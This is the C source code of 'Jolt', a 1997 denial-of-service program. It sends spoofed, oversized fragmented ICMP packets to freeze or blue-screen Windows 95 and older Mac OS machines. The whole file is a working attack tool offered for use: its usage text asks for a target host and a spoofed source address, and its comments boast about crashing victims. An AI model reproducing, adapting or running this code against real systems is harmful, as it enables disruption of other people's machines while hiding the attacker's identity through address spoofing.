

/* Jolt 1.0 (c) 1997 by Jeff w. Roberson
 * Please, if you use my code give me credit.  Also, if i was the first to
 * find this glitch, please give me credit.  Thats all i ask.
 *
 * Ok so all this does is build a really fraggmented over sized packet
 * and once win95 gets it, and puts it back together it locks.  I send
 * multiple packets by default cause some times it takes a few packets to
 * totally freeze the host.  Maybe its spending processor time to figure
 * out how to put them back together?  I've had reports of people blue
 * screening from it tho so we'll let Microsoft's boys figure out exactly
 * what this does to 95.  As of now i haven't tested it on NT, but maybe
 * i will later ;).  All of this source wasn't origonally written by me
 * I just took one of the old programs to kill POSIX and SYSV based
 * systems and worked on it abit, then made it spoof =). 
 * VallaH  (yaway@hotmail.com)
 *
 *  Update: It apears to work on some older versions of mac os
 */

/* Yah this is for linux, but i like the BSD ip header better then linux's */
#define __BSD_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <string.h>
#include <arpa/inet.h>

int main(int argc, char **argv)
{
	int s,i;
	char buf[400];
	struct ip *ip = (struct ip *)buf;
	struct icmphdr *icmp = (struct icmphdr *)(ip + 1);
	struct hostent *hp, *hp2;
	struct sockaddr_in dst;
	int offset;
	int on;
	int num = 5;

	if (argc < 3) {
		printf("Jolt v1.0 Yet ANOTHER windows95(And macOS!) glitch by VallaH (yaway@hotmail.com)\n");
		printf("\nusage: %s <dstaddr> <saddr> [number]\n",argv[0]);
		printf("\tdstaddr is the host your attacking\n");
		printf("\tsaddr is the host your spoofing from\n");
		printf("\tNumber is the number of packets to send, 5 is the default\n");
		printf("\nNOTE:  This is based on a bug that used to affect POSIX complient, and SYSV \n\t systems so its nothing new..\n");
		printf("\nGreets to Bill Gates! How do ya like this one? :-)\n");
		exit(1);
	}
	if (argc == 4) num = atoi(argv[3]);
    for (i=1;i<=num;i++) {
	on=1;
	bzero(buf, sizeof buf);

	if ((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW )) < 0) {
		perror("socket");
		exit(1);
	}
	if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
		perror("IP_HDRINCL");
		exit(1);
	}

	if ((hp = gethostbyname(argv[1])) == NULL) {
		if ((ip->ip_dst.s_addr = inet_addr(argv[1])) == -1) {
			fprintf(stderr, "%s: unknown host\n", argv[1]);
			exit(1);
		}
	} else {
		bcopy(hp->h_addr_list[0], &ip->ip_dst.s_addr, hp->h_length);
	}

	if ((hp2 = gethostbyname(argv[2])) == NULL) {
		if ((ip->ip_src.s_addr = inet_addr(argv[2])) == -1) {
			fprintf(stderr, "%s: unknown host\n", argv[2]);
			exit(1);
		}
	} else {
		bcopy(hp2->h_addr_list[0], &ip->ip_src.s_addr, hp->h_length);
	}

	printf("Sending to %s\n", inet_ntoa(ip->ip_dst));
	ip->ip_v = 4;
	ip->ip_hl = sizeof *ip >> 2;
	ip->ip_tos = 0;
	ip->ip_len = htons(sizeof buf);
	ip->ip_id = htons(4321);
	ip->ip_off = htons(0);
	ip->ip_ttl = 255;
	ip->ip_p = 1;
	/*ip->ip_csum = 0;                 * kernel fills in */

	dst.sin_addr = ip->ip_dst;
	dst.sin_family = AF_INET;

	icmp->type = ICMP_ECHO;
	icmp->code = 0;
	icmp->checksum = htons(~(ICMP_ECHO << 8));
	for (offset = 0; offset < 65536; offset += (sizeof buf - sizeof *ip)) {
		ip->ip_off = htons(offset >> 3);
		if (offset < 65120)
			ip->ip_off |= htons(0x2000);
		else
			ip->ip_len = htons(418);  /* make total 65538 */
		if (sendto(s, buf, sizeof buf, 0, (struct sockaddr *)&dst,
					sizeof dst) < 0) {
			fprintf(stderr, "offset %d: ", offset);
			perror("sendto");
		}
		if (offset == 0) {
			icmp->type = 0;
			icmp->code = 0;
			icmp->checksum = 0;
		}
	}
	close(s);
	usleep(30000);
    }
	return 0;
}
